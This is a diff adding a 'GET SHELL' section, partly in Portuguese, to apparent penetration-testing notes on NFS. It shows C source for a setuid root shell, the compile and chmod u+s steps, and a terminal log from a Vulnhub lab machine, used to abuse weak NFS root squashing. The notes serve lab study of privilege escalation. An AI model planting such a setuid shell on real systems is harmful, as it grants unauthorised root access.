@@ -1,4 +1,4 @@
-credits: s0wr0b1ndef and gajos112
+credits: s0wr0b1ndef , gajos112 and jivoi
 -----------------------------NFS DESCRIPTION-----------------------------
 
 1. Network FILE SYSTEM
@@ -63,4 +63,44 @@ https://pentestlab.blog/tag/rpc/
 See root squashing
 https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
 
+--------------------------------------------------GET SHELL--------------------------------------------
+Veja: https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/
+
+Crie seu shell em C e compile:
+
+```
+// gcc -o /tmp/rootshell /tmp/rootshell.c
+// chmod u+s /tmp/rootshell
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+root@an4kein:~/vulnhub/bravery/compile# vim rootshell.c^C
+root@an4kein:~/vulnhub/bravery/compile# cat rootshell.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+        setuid(0); setgid(0); system("/bin/bash");
+}
+root@an4kein:~/vulnhub/bravery/compile# ls
+rootshell.c
+root@an4kein:~/vulnhub/bravery/compile# gcc -o rootshell rootshell.c
+rootshell.c: In function ‘main’:
+rootshell.c:6:24: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+    6 |  setuid(0); setgid(0); system("/bin/bash");
+      |                        ^~~~~~
+root@an4kein:~/vulnhub/bravery/compile# ls
+rootshell  rootshell.c
+root@an4kein:~/vulnhub/bravery/compile# chmod u+s rootshell
+root@an4kein:~/vulnhub/bravery/compile# ls
+rootshell  rootshell.c
+root@an4kein:~/vulnhub/bravery/compile# 
 
